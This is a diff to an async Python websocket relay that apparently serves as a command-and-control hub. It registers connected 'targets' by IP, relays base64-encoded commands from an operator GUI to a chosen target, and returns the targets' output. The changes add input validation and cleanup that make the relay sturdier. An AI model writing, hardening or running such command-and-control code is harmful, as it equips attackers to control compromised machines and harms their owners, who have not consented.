@@ -26,7 +26,9 @@ async def tratar_conexao(ws):
             await ws.send("OK_GUI")
             async for msg in ws:
                 if msg.startswith("CMD|"):
-                    _, aid_b, b64 = msg.split("|",2)
+                    partes = msg.split("|", 2)
+                    if len(partes) < 3: continue
+                    _, aid_b, b64 = partes
                     aid = int(aid_b)
                     dados = base64.b64decode(b64)
                     with lock:
@@ -34,18 +36,19 @@ async def tratar_conexao(ws):
                             await alvos[aid]["ws"].send(dados.decode())
         else:
             aid = prox_id
-            prox_id +=1
+            prox_id += 1
             info = prim
             ip = ws.remote_address[0]
             with lock:
-                alvos[aid] = {"ws":ws,"ip":ip,"info":info}
+                alvos[aid] = {"ws": ws, "ip": ip, "info": info}
             print(f"[RELAY] ALVO {aid} CONECTADO: {info}", flush=True)
             await enviar_gui(f"NOVO_ALVO|{aid}|{ip}|{info}")
             async for msg in ws:
                 await enviar_gui(f"RESPOSTA|{aid}|{base64.b64encode(msg.encode()).decode()}")
     finally:
         if prim != "SOU_GUI":
-            with lock: alvos.pop(aid, None)
+            with lock:
+                if aid in alvos: alvos.pop(aid, None)
             await enviar_gui(f"SAIU_ALVO|{aid}")
             print(f"[RELAY] ALVO {aid} DESCONECTADO", flush=True)
 
